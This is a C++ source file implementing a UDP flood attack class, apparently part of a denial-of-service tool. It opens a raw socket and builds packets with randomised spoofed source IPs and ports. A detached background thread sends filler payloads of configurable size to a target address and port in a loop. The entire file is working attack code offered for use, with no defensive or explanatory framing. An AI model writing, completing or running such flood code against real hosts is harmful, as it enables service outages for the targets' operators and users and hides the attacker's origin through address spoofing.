#include "attack/UDPAttack.h"
#include "network/PacketBuilder.h"
#include "network/RawSocket.h"
#include "util/Logger.h"
#include "util/Randomizer.h"
#include <thread>
#include <chrono>

UDPAttack::UDPAttack(const std::string& targetIP, int targetPort, int packetSize, int delayMs)
    : targetIP_(targetIP), targetPort_(targetPort), packetSize_(packetSize), delayMs_(delayMs) {}

UDPAttack::~UDPAttack() {
    stop();
}

void UDPAttack::start() {
    if (running_) return;
    
    running_ = true;
    Logger::getInstance().log(LogLevel::INFO, "Starting UDP attack on " + targetIP_ + ":" + std::to_string(targetPort_));
    
    std::thread([this]() {
        try {
            RawSocket socket(IPPROTO_UDP);
            
            while (running_) {
                // 生成随机源IP和端口
                std::string sourceIP = Randomizer::getInstance().randomIP();
                uint16_t sourcePort = Randomizer::getInstance().randomInt(1024, 65535);
                
                auto packet = PacketBuilder::buildUDPPacket(
                    sourceIP, targetIP_, sourcePort, targetPort_, 
                    std::string(packetSize_, 'A'));
                
                if (!socket.sendPacket(packet)) {
                    Logger::getInstance().log(LogLevel::ERROR, "Failed to send UDP packet");
                }
                
                std::this_thread::sleep_for(std::chrono::milliseconds(delayMs_));
            }
        } catch (const std::exception& e) {
            Logger::getInstance().log(LogLevel::ERROR, "UDP attack error: " + std::string(e.what()));
            running_ = false;
        }
    }).detach();
}

void UDPAttack::stop() {
    running_ = false;
    Logger::getInstance().log(LogLevel::INFO, "Stopped UDP attack");
}

std::string UDPAttack::getDescription() const {
    return "UDP flood attack targeting " + targetIP_ + ":" + 
           std::to_string(targetPort_) + " with " + 
           std::to_string(packetSize_) + " byte packets";
}